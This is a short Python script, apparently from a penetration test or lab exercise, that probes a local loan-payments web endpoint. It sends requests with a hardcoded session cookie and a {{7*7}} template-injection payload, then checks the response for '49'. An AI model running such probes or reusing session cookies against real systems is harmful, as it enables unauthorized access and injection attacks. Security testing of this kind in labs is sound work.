import urllib.request, json

try:
    with urllib.request.urlopen("http://127.0.0.1:32790/total_loan_payments", timeout=10) as resp:
        data = resp.read().decode()
        print(f"Status: {resp.status}")
        print(f"Response: {data[:300]}")
except Exception as e:
    print(f"Error: {e}")

# Test with session cookie
try:
    req = urllib.request.Request("http://127.0.0.1:32790/total_loan_payments")
    req.add_header("Cookie", "session=eyJ1c2VyX2lkIjoxfQ.aVlvKQ.Ahoc9Ula-DnHQaF2W1Cj0InvBaA")
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = resp.read().decode()
        print(f"\\nWith cookie - Status: {resp.status}")
        print(f"Response: {data[:300]}")
except Exception as e:
    print(f"Error with cookie: {e}")

# Test with payload
try:
    req = urllib.request.Request("http://127.0.0.1:32790/total_loan_payments?param=%7B%7B7*7%7D%7D")
    req.add_header("Cookie", "session=eyJ1c2VyX2lkIjoxfQ.aVlvKQ.Ahoc9Ula-DnHQaF2W1Cj0InvBaA")
    with urllib.request.urlopen(req, timeout=10) as resp:
        data = resp.read().decode()
        print(f"\\nWith payload - Status: {resp.status}")
        print(f"Response: {data[:300]}")
        print(f"Contains '49': {'49' in data}")
except Exception as e:
    print(f"Error with payload: {e}")
